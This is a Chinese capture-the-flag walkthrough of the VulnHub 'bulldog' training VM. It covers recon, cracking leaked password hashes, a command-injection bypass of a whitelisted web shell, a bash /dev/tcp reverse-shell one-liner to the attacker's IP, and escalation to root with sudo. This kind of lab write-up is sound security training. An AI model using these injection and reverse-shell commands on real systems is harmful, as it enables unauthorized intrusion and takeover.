---
title: Vulnhub-bulldog
---

# Vulnhub-bulldog

## 靶机信息

### 下载链接

[https://download.vulnhub.com/bulldog/bulldog.ova](https://download.vulnhub.com/bulldog/bulldog.ova)

### 靶机说明

牛头犬行业最近的网站被恶意的德国牧羊犬黑客破坏。这是否意味着有更多漏洞可以利用？你为什么找不到呢?

这是标准的Boot-to-Root,目标是进入root目录并看到祝贺消息。

### 目标

获得root权限和flag。

### 运行环境

靶机：NAT模式，靶机自动获取IP
攻击机：windows10、kali linux2021.1

## 信息收集

### 目标发现

```shell
arp-scan -l
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-1.png)


### 端口和服务识别

使用nmap扫描1-65535全端口，并做服务指纹识别，扫描结果保存到txt文件，命令：

```shell
nmap -p1-65535 -A 192.168.160.189 -oN bulldog.txt
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-3.png)

发现目标主机端口和服务

```shell
#端口 协议 后端服务
TCP 23 SSH open-ssl 7.2p2
TCP 80 HTTP WSGIServer Python 2.7.12
TCP 8080 HTTP WSGIServer Python 2.7.12
#操作系统
Linux 3.2-4.9
```

## 漏洞挖掘

直接访问网站首页，有链接，点击进入notice页面，未发现有价值的信息

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-2.png)

目录扫描`dirb http://192.168.160.189`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-4.png)

得到多个目录，依此访问

`htttp://192.168.160.189/admin`,这是一个Django管理后台，需要用户名、密码登录，试了下没有常见弱口令，先不尝试暴破，去看看其他页面。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-5.png)

`htttp://192.168.160.189/dev`该页面信息很多;主要信息：新系统不再使用php或任何CMS，而是使用Django框架开发。这意味着不太可能再找到网页的注入漏洞，只能找Django框架漏洞；网站不使用php，所以不用再找再找php漏洞或者写php木马了。新系统使用webshell管理。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-6.png)

`http://192.168.160.189/dev/shell/`该页面提示要认证才可访问。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-7.png)

查看以上各页面源码，发现`htttp://192.168.160.189/dev`每个Team Lead的邮箱和hash并且有明显的英文提示：We'll remove these in prod. It's not like a hacker can do anything with a hash。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-8.png)

把每个hash值，到[https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)尝试碰撞解密，最终解密出2个hash值：

Back End: nick@bulldogindustries.com

用户名：nick，密码：bulldog

Database: sarah@bulldogindustries.com

用户名：sarah，密码：bulldoglover

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-9.png)

用解密出来的密码登录后台

尝试登录扫描出来的23端口ssh都失败了，使用sarah、密码bulldoglover成功登录管理后台，但是没有编辑权限。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-10.png)

再去访问webshell页面，已通过认证，可执行命令，这是一个命令执行界面

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-11.png)

webshell页面只能执行白名单的命令，尝试用；或者&&连接，执行多个命令，发现能成功绕过，下面开始直接执行反弹shell命令。

开启nc监听：`nc -lvnp 4444`
直接执行`ls && bash -i >& /dev/tcp/172.20.10.5/4444 0>&1`失败，server报错500。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-12.png)

尝试echo命令先输出命令，再输入到bash，`echo "bash -i >& /dev/tcp/172.20.10.5/4444 0>&1" | bash`。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-13.png)

反弹shell成功，并能成功查看/etc/passwd,发现id=1000以后的用户：bulldogadmin、django

## 提权

查找每个用户的文件（不显示错误） `find / -user bulldogadmin 2>/dev/null`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-14.png)

发现值得关注的文件有：一个是note，一个是customPermissionApp。

```shell
/home/bulldogadmin/.hiddenadmindirectory/note
/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
```

打开note文本文件：发现提示webserver有时需要root权限访问。note文件中提示执行该文件，可以获得root权限，但通过ls查看文件权限只有读权限，并无法执行。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-15.png)

打开customPermissionApp，看上去是可执行文件，使用strings打印其中的可打印字符：`strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp`观察文件中只有这些字符，疑似可能与密码相关，英文单词包括：SUPER、 ulitimate、PASSWORD、youCANTget，这些都与最高权限账号相关，去掉H，变成一句通顺的英文句子：`SUPERultimatePASSWORDyouCANTget`,su命令无法执行，提示：must be run from a terminal,执行下面的语句即可

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-16.png)

执行`sudo su -`，获得root权限，获取flag

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-17.png)

```bash
#恭喜你完成了这个VM:D，还不错吧？
#告诉我你在twitter上的想法，我是@frichette\n
#据我所知，有两种方法可以扎根。你能找到另一个吗？
#也许续集会更具挑战性。直到下次，我希望你喜欢
Conngratulations on completing this VM :D That wasn't so bad was it?
Let me know what you thought on twitter, I'm @frichette_n
As far as I know there are two ways to get root. Can you find the other one?
Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed
```